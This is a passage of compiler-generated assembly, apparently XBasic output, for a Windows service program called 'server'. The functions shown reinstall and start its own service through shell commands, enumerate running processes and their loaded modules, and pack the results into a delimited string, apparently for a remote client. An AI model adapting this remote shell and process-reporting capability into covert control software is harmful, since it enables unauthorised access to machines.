  fs mov [0],ebx       ;;; remove unwind handler
  call free.func69.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func69.server:
	mov	esi,d[ebp-40]			;;; i665
	call	%_FreeArray			;;; i424
  ret
;-peep
;  *****
;  *****  END FUNCTION  CmdInitService ()  *****
;  *****
;
; [305] FUNCTION CmdRefreshService ()
.code
align 16
_CmdRefreshService.server@0:
;  *****
;  *****  FUNCTION  CmdRefreshService ()  *****
;  *****
func68.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody68.server:
;
; [307] ClientShell (0,GetServerPath()+" -remove")
	call	func14.server			;;; i619
	mov	ebx,addr @_string.0100.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	0			;;; i656a
	call	func29.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [308] Sleep(5000)
;
; [0] EXTERNAL FUNCTION Sleep (dwMilliseconds)
	push	5000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [309] ClientShell (0,GetServerPath()+" -install")
	call	func14.server			;;; i619
	mov	ebx,addr @_string.0102.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	0			;;; i656a
	call	func29.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [310] Sleep(5000)
	push	5000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [311] ClientShell (0,"net.exe start "+$$ServName)
	mov	eax,addr @_string.00FA.server			;;; i663
	mov	ebx,addr @_string.0075.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	0			;;; i656a
	call	func29.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [313] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CmdRefreshService.server:  ;;; Function end label for Assembly Programmers.
end.func68.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  CmdRefreshService ()  *****
;  *****
;
; [316] FUNCTION STRING GetModules(processID)
.code
;
#ifdef GetModules.processID
#undef GetModules.processID
#endif
#define GetModules.processID ebp+8	; exposes function argument 'processID'
;
align 16
_GetModules.server@4:
;  *****
;  *****  FUNCTION  GetModules ()  *****
;  *****
func81.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func81.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.35:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.35			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,152			;;; i114a
;
funcBody81.server:
;
; [317] XLONG hMods[]
#ifdef GetModules.hMods
#undef GetModules.hMods
#endif
#define GetModules.hMods ebp-40	; exposes local variable 'hMods'
;
;
; [318] STRING szModName,buffer,title
#ifdef GetModules.szModName
#undef GetModules.szModName
#endif
#define GetModules.szModName ebp-44	; exposes local variable 'szModName'
;
#ifdef GetModules.buffer
#undef GetModules.buffer
#endif
#define GetModules.buffer ebp-48	; exposes local variable 'buffer'
;
#ifdef GetModules.title
#undef GetModules.title
#endif
#define GetModules.title ebp-52	; exposes local variable 'title'
;
;
; [322] ' Get a list of all the modules in this process.
;
; [323] hProcess = OpenProcess($$PROCESS_QUERY_INFORMATION | $$PROCESS_VM_READ, 0, processID )
#ifdef GetModules.hProcess
#undef GetModules.hProcess
#endif
#define GetModules.hProcess ebp-56	; exposes local variable 'hProcess'
;
;
; [0] EXTERNAL FUNCTION OpenProcess (dwDesiredAccess, bInheritHandle, dwProcessId)
	mov	eax,1024			;;; i659
	or	eax,16			;;; i763
; .xstk81.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	push	[ebp+8]			;;; i674a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_OpenProcess@12			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [324] IFZ hProcess THEN RETURN ""
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0003.server			;;; i195
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func81.server			;;; i258
else.0003.server:
end.if.0003.server:
;
; [326] DIM hMods[1024]
	sub	esp,64			;;; i430
	mov	eax,1024			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp-40]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073217532			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp-40],eax			;;; i670
;
; [327] cbNeeded = 0
#ifdef GetModules.cbNeeded
#undef GetModules.cbNeeded
#endif
#define GetModules.cbNeeded ebp-68	; exposes local variable 'cbNeeded'
;
	mov	eax,0			;;; i659
	mov	d[ebp-68],eax			;;; i670
;
; [329] IF EnumProcessModules (hProcess, &hMods[], SIZE(hMods[]), &cbNeeded) THEN
;
; [0] EXTERNAL CFUNCTION EnumProcessModules(HANDLE,pHMODULE,DWORD,LPDWORD)
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i586
	jz	> A.30			;;; i587
	mov	esi,d[eax-4]			;;; i588
	mov	eax,d[eax-8]			;;; i589
	and	esi,65535			;;; i590
	imul	eax,esi			;;; i591
A.30:
	mov	d[ebp-64],eax			;;; i670
	lea	eax,[ebp-68]			;;; i642
	push	eax			;;; i667a
	push	[ebp-64]			;;; i674a
	push	[ebp-40]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	_EnumProcessModules			;;; i619
	add	esp,16			;;; i633
	test	eax,eax			;;; i220
	jz	>> else.0004.server			;;; i221
;
; [330] cbNeeded = cbNeeded / 4
	mov	eax,d[ebp-68]			;;; i665
	mov	esi,4
	cdq	
	idiv	esi
	mov	d[ebp-68],eax			;;; i670
;
; [331] 'PRINT cbNeeded
;
; [332] FOR i = 0 TO cbNeeded
#ifdef GetModules.i
#undef GetModules.i
#endif
#define GetModules.i ebp-72	; exposes local variable 'i'
;
	mov	eax,0			;;; i659
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-68]			;;; i665
; .forlimit81.0005 = ebp-76	; internal variable
	mov	d[ebp-76],eax			;;; i670
align 8
for.0005.server:
	mov	eax,d[ebp-72]			;;; i665
	mov	ebx,d[ebp-76]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0005.server			;;; i154
;
; [333] IF hMods[i] THEN
	mov	eax,d[ebp-72]			;;; i665
	mov	edx,d[ebp-40]			;;; i665
	mov	eax,d[edx+eax*4]			;;; i464
	test	eax,eax			;;; i220
	jz	>> else.0006.server			;;; i221
;
; [334] szModName = SPACE$(256)
	sub	esp,64			;;; i487
	mov	d[esp],256
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [335] 'PRINT i,hMods[i],ret ',LEFT$(szModName,ret)
;
; [336] GetModuleFileNameExA (hProcess, hMods[i], &szModName, SIZE(szModName))
;
; [0] EXTERNAL CFUNCTION GetModuleFileNameExA( HANDLE,HMODULE,LPSTR,DWORD)
	mov	eax,d[ebp-72]			;;; i665
	mov	edx,d[ebp-40]			;;; i665
	mov	eax,d[edx+eax*4]			;;; i464
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
; .xstk81.0001 = ebp-84	; internal variable
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.31			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.31:
	push	eax			;;; i667a
	push	[ebp-84]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	_GetModuleFileNameExA			;;; i619
	add	esp,16			;;; i633
;
; [337] IF ret THEN
#ifdef GetModules.ret
#undef GetModules.ret
#endif
#define GetModules.ret ebp-88	; exposes local variable 'ret'
;
	mov	eax,d[ebp-88]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0007.server			;;; i221
;
; [338] '	name = LEFT$(szModName,ret)
;
; [339] '  IF name != "" THEN
;
; [340] '	buffer = buffer + "\1\2---\t" + LEFT$(szModName,ret)
;
; [341] END IF
else.0007.server:
end.if.0007.server:
;
; [342] END IF
else.0006.server:
end.if.0006.server:
;
; [343] NEXT i
do.next.0005.server:
	inc	d[ebp-72]			;;; i229
	jmp	for.0005.server			;;; i231
end.for.0005.server:
;
; [344] END IF
else.0004.server:
end.if.0004.server:
;
; [345] CloseHandle(hProcess)
;
; [0] EXTERNAL FUNCTION CloseHandle (hObject)
	push	[ebp-56]			;;; i674a
	call	_CloseHandle@4			;;; i619
;
; [347] RETURN buffer
	mov	eax,[ebp-48]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func81.server			;;; i258
;
; [348] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetModules.server:  ;;; Function end label for Assembly Programmers.
end.func81.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func81.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func81.server:
	mov	esi,d[ebp-40]			;;; i665
	call	%_FreeArray			;;; i424
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetModules ()  *****
;  *****
;
; [350] FUNCTION STRING GetProcList ()
.code
align 16
_GetProcList.server@0:
;  *****
;  *****  FUNCTION  GetProcList ()  *****
;  *****
func1F.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func1F.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.42:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.42			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,152			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,9				;;; ..
	xor	eax,eax			;;; ...
A.43:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.43			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-52],eax			;;; i670
funcBody1F.server:
;
; [351] FUNCADDR pCreateToolhelp32Snapshot (XLONG, XLONG)
#ifdef GetProcList.pCreateToolhelp32Snapshot
#undef GetProcList.pCreateToolhelp32Snapshot
#endif
#define GetProcList.pCreateToolhelp32Snapshot ebp-40	; exposes local variable 'pCreateToolhelp32Snapshot'
;
;
; [352] FUNCADDR pProcess32Next (XLONG, XLONG)
#ifdef GetProcList.pProcess32Next
#undef GetProcList.pProcess32Next
#endif
#define GetProcList.pProcess32Next ebp-44	; exposes local variable 'pProcess32Next'
;
;
; [353] PROCESSENTRY32 proc
; .composites = ebp-48	; internal variable
#ifdef GetProcList.proc
#undef GetProcList.proc
#endif
#define GetProcList.proc ebp-52	; exposes local variable 'proc'
;
;
; [354] STRING buffer,process
#ifdef GetProcList.buffer
#undef GetProcList.buffer
#endif
#define GetProcList.buffer ebp-56	; exposes local variable 'buffer'
;
#ifdef GetProcList.process
#undef GetProcList.process
#endif
#define GetProcList.process ebp-60	; exposes local variable 'process'
;
;
; [357] libHandle = LoadLibraryA(&"kernel32.dll")
#ifdef GetProcList.libHandle
#undef GetProcList.libHandle
#endif
#define GetProcList.libHandle ebp-64	; exposes local variable 'libHandle'
;
;
; [0] EXTERNAL FUNCTION LoadLibraryA (lpLibFileName)
	mov	eax,addr @_string.0114.server			;;; i642
	push	eax			;;; i667a
	call	_LoadLibraryA@4			;;; i619
	mov	d[ebp-64],eax			;;; i670
;
; [358] IFZ libHandle THEN RETURN ""
	mov	eax,d[ebp-64]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0008.server			;;; i195
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func1F.server			;;; i258
else.0008.server:
end.if.0008.server:
;
; [360] hpsapi = LoadLibraryA(&"psapi.dll")
#ifdef GetProcList.hpsapi
#undef GetProcList.hpsapi
#endif
#define GetProcList.hpsapi ebp-68	; exposes local variable 'hpsapi'
;
	mov	eax,addr @_string.0116.server			;;; i642
	push	eax			;;; i667a
	call	_LoadLibraryA@4			;;; i619
	mov	d[ebp-68],eax			;;; i670
;
; [361] IFZ libHandle THEN RETURN ""
	mov	eax,d[ebp-64]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0009.server			;;; i195
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func1F.server			;;; i258
else.0009.server:
end.if.0009.server:
;
; [363] 'GetModuleFileNameExA(HPANDLE,0,&buffer,SIZE(buffer))
;
; [365] buffer = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [366] tprocess = 0
#ifdef GetProcList.tprocess
#undef GetProcList.tprocess
#endif
#define GetProcList.tprocess ebp-72	; exposes local variable 'tprocess'
;
	mov	eax,0			;;; i659
	mov	d[ebp-72],eax			;;; i670
;
; [367] pCreateToolhelp32Snapshot = GetProcAddress(libHandle, &"CreateToolhelp32Snapshot")
;
; [0] EXTERNAL FUNCTION GetProcAddress (hModule, lpProcName)
	mov	eax,addr @_string.0118.server			;;; i642
	push	eax			;;; i667a
	push	[ebp-64]			;;; i674a
	call	_GetProcAddress@8			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [368] IF pCreateToolhelp32Snapshot THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.000A.server			;;; i221
;
; [369] pProcess32Next = GetProcAddress(libHandle, &"Process32Next")
	mov	eax,addr @_string.0119.server			;;; i642
	push	eax			;;; i667a
	push	[ebp-64]			;;; i674a
	call	_GetProcAddress@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [370] IF pProcess32Next THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.000B.server			;;; i221
;
; [371] hSnap = @pCreateToolhelp32Snapshot($$TH32CS_SNAPALL, 0)
#ifdef GetProcList.hSnap
#undef GetProcList.hSnap
#endif
#define GetProcList.hSnap ebp-76	; exposes local variable 'hSnap'
;
	mov	eax,d[ebp-40]			;;; i665
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.36			;;; i604
; .xstk1F.0000 = ebp-84	; internal variable
	mov	d[ebp-84],eax			;;; i670
	push	0			;;; i656a
	push	15			;;; i656a
	mov	eax,d[ebp-84]			;;; i665
	call	eax			;;; i620
A.36:
	mov	d[ebp-76],eax			;;; i670
;
; [372] IF hSnap THEN
	mov	eax,d[ebp-76]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.000C.server			;;; i221
;
; [373] proc.dwSize = SIZE(proc)
	mov	eax,296			;;; i584
	mov	ebx,d[ebp-52]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [374] f = 1
#ifdef GetProcList.f
#undef GetProcList.f
#endif
#define GetProcList.f ebp-88	; exposes local variable 'f'
;
	mov	eax,1			;;; i659
	mov	d[ebp-88],eax			;;; i670
;
; [375] DO
align 8
do.000D.server:
;
; [376] f = @pProcess32Next(hSnap, &proc)
	mov	eax,d[ebp-44]			;;; i665
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.37			;;; i604
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i642
	push	eax			;;; i667a
	push	[ebp-76]			;;; i674a
	mov	eax,d[ebp-84]			;;; i665
	call	eax			;;; i620
A.37:
	mov	d[ebp-88],eax			;;; i670
;
; [377] IF f THEN
	mov	eax,d[ebp-88]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.000E.server			;;; i221
;
; [378] INC tprocess
	inc	d[ebp-72]			;;; i84
;
; [379] process = STRING$(proc.th32ProcessID)+"\t"+RTRIM$(proc.szExeFile)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-52]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.slong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.011F.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-84],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-52]			;;; i665
	lea	esi,[eax+36]			;;; i308
	mov	edi,260			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	d[esp],eax			;;; i887
	call	%_rtrim.d.s			;;; i583
	add	esp,64			;;; i600
	mov	ebx,[ebp-84]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-60]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [380] IFZ buffer THEN
	mov	eax,[ebp-56]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.38			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.000F.server			;;; i192
A.38:
;
; [381] buffer = buffer + ":"+process'+ GetModules(proc.th32ProcessID)
	mov	eax,[ebp-56]			;;; i665
	mov	ebx,addr @_string.0121.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-60]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [382] ELSE
	jmp	end.if.000F.server			;;; i107
else.000F.server:
;
; [383] buffer = buffer + "\1\2:"+process'+ GetModules(proc.th32ProcessID)
	mov	eax,[ebp-56]			;;; i665
	mov	ebx,addr @_string.0122.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-60]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [384] END IF
end.if.000F.server:
;
; [385] END IF
else.000E.server:
end.if.000E.server:
;
; [386] LOOP WHILE f
do.loop.000D.server:
	mov	eax,d[ebp-88]			;;; i665
	test	eax,eax			;;; i194
	jnz	< do.000D.server			;;; i195
end.do.000D.server:
;
; [387] buffer = buffer + "\1\2"+STRING(tprocess)+" processes"
	mov	eax,[ebp-56]			;;; i665
	mov	ebx,addr @_string.0123.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-84],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-72]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-84]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0124.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [388] END IF
else.000C.server:
end.if.000C.server:
;
; [389] END IF
else.000B.server:
end.if.000B.server:
;
; [390] END IF
else.000A.server:
end.if.000A.server:
;
; [392] IF hSnap THEN CloseHandle (hSnap)
	mov	eax,d[ebp-76]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0010.server			;;; i221
	push	[ebp-76]			;;; i674a
	call	_CloseHandle@4			;;; i619
else.0010.server:
end.if.0010.server:
;
; [393] IF libHandle THEN CloseHandle (libHandle)
	mov	eax,d[ebp-64]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0011.server			;;; i221
	push	[ebp-64]			;;; i674a
	call	_CloseHandle@4			;;; i619
else.0011.server:
end.if.0011.server:
;
; [394] IFZ buffer THEN buffer = ":unable to acquire process list"
	mov	eax,[ebp-56]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.39			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0012.server			;;; i192
A.39:
	mov	eax,addr @_string.0125.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0012.server:
end.if.0012.server:
;
; [395] RETURN buffer
	mov	eax,[ebp-56]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func1F.server			;;; i258
;
; [396] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetProcList.server:  ;;; Function end label for Assembly Programmers.
end.func1F.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func1F.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func1F.server:
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetProcList ()  *****
;  *****
;
; [398] FUNCTION IsProcess (STRING name)
.code
;
#ifdef IsProcess.name
#undef IsProcess.name
#endif
#define IsProcess.name ebp+8	; exposes function argument 'name'
;
align 16
_IsProcess.server@4:
;  *****
;  *****  FUNCTION  IsProcess ()  *****
;  *****
func62.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.48:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.48			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,9				;;; ..
	xor	eax,eax			;;; ...
A.49:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.49			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-52],eax			;;; i670
funcBody62.server:
;
; [399] FUNCADDR pCreateToolhelp32Snapshot (XLONG, XLONG)
#ifdef IsProcess.pCreateToolhelp32Snapshot
#undef IsProcess.pCreateToolhelp32Snapshot
#endif
#define IsProcess.pCreateToolhelp32Snapshot ebp-40	; exposes local variable 'pCreateToolhelp32Snapshot'
;
;
; [400] FUNCADDR pProcess32Next (XLONG, XLONG)
#ifdef IsProcess.pProcess32Next
#undef IsProcess.pProcess32Next
#endif
#define IsProcess.pProcess32Next ebp-44	; exposes local variable 'pProcess32Next'
;
;
; [401] PROCESSENTRY32 proc
; .composites = ebp-48	; internal variable
#ifdef IsProcess.proc
#undef IsProcess.proc
#endif
#define IsProcess.proc ebp-52	; exposes local variable 'proc'
;
;
; [404] libHandle = LoadLibraryA(&"kernel32.dll")
#ifdef IsProcess.libHandle
#undef IsProcess.libHandle
#endif
#define IsProcess.libHandle ebp-56	; exposes local variable 'libHandle'
;
	mov	eax,addr @_string.0114.server			;;; i642
	push	eax			;;; i667a
	call	_LoadLibraryA@4			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [405] IFZ libHandle THEN RETURN $$FALSE
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0013.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func62.server			;;; i258
else.0013.server:
end.if.0013.server:
;
; [407] pCreateToolhelp32Snapshot = GetProcAddress(libHandle, &"CreateToolhelp32Snapshot")
	mov	eax,addr @_string.0118.server			;;; i642
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	call	_GetProcAddress@8			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [408] IF pCreateToolhelp32Snapshot THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0014.server			;;; i221
;
; [409] pProcess32Next = GetProcAddress(libHandle, &"Process32Next")
	mov	eax,addr @_string.0119.server			;;; i642
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	call	_GetProcAddress@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [410] IF pProcess32Next THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0015.server			;;; i221
;
; [411] hSnap = @pCreateToolhelp32Snapshot($$TH32CS_SNAPPROCESS, 0)
#ifdef IsProcess.hSnap
#undef IsProcess.hSnap
#endif
#define IsProcess.hSnap ebp-60	; exposes local variable 'hSnap'
;
	mov	eax,d[ebp-40]			;;; i665
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.44			;;; i604
; .xstk62.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	push	0			;;; i656a
	push	2			;;; i656a
	mov	eax,d[ebp-68]			;;; i665
	call	eax			;;; i620
A.44:
	mov	d[ebp-60],eax			;;; i670
;
; [412] IF hSnap THEN
	mov	eax,d[ebp-60]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0016.server			;;; i221
;
; [413] proc.dwSize = SIZE(proc)
	mov	eax,296			;;; i584
	mov	ebx,d[ebp-52]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [414] f = 1
#ifdef IsProcess.f
#undef IsProcess.f
#endif
#define IsProcess.f ebp-72	; exposes local variable 'f'
;
	mov	eax,1			;;; i659
	mov	d[ebp-72],eax			;;; i670
;
; [415] DO
align 8
do.0017.server:
;
